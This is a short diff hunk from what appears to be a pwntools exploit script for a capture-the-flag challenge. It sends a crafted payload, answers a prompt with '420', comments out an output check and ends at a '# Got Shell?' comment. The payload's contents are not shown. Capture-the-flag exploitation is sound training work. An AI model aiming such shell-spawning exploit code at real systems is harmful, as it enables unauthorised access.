@@ -88,7 +88,7 @@ payload = flat(
 io.sendlineafter('commands: ', payload)
 io.sendlineafter(b'>','420')
 
-io.recvuntil(b"Too bad, now who's gonna save Gotham? Alfred?\n")
+#io.recvuntil(b"Too bad, now who's gonna save Gotham? Alfred?\n")
 #io.recvuntil(b'Thank you!')
 
 # Got Shell?
